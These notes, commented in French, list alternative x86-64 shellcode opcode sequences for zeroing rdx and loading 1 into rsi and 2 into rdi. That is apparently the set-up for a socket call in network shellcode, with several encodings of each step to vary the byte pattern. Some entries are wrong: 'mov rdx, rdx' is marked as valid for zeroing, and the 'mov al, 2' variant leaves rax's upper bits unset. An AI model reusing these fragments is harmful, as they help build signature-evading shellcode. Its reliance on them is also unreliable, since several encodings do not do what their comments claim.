"\x55" # push rbp
"\x48\x89\xe5" # mov rbp,rsp

# Tous les opcodes qui peuvent fonctionner pour r√©aliser l'action xor pour rdx

"\x48\x31\xd2" # xor rdx rdx OK
"\x48\x89\xd2" # mov rdx, rdx OK
"\x48\x31\xc0\x48\x01\xd0\x48\x29\xc2" # xor rax, rax | add rax, rdx | sub rdx, rax A MODIFIER
"\x48\x29\xd2" # sub rdx, rdx  OK
"\x48\x31\xc0\x48\xc1\xe0\x40\x48\x89\xc2" # xor rax, rax | shl rax, 64 | mov rdx, rax A MODIFIER


# Tous les opcodes qui peuvent fonctionner pour placer 1 dans rsi

"\x6a\x01\x5e" # push 1 | pop rsi
"\x48\x31\xf6\x48\xff\xc6" # xor rsi, rsi | inc rsi
"\x48\x31\xf6\x48\x83\xc6\x01"  # xor rsi, rsi | add rsi, 1
"\xbe\x01\x00\x00\x00\x48\xf7\xe6" # mov rsi, 1 | mul rsi


# Tous les opcodes qui peuvent fonctionner pour placer 2 dans rdi

"\x6a\x02\x5f" # push 2 | pop rdi
"\x48\x31\xff\x48\xff\xc7\x48\xff\xc7" # xor rdi, rdi | inc rdi | inc rdi
"\x48\x31\xff\x48\x83\xc7\x01\x48\x83\xc7\x01"  # xor rdi, rdi | add rdi, 1 | add rdi, 1
"\xb0\x02\x48\x89\xc7" # mov al, 2 | mov rdi, rax 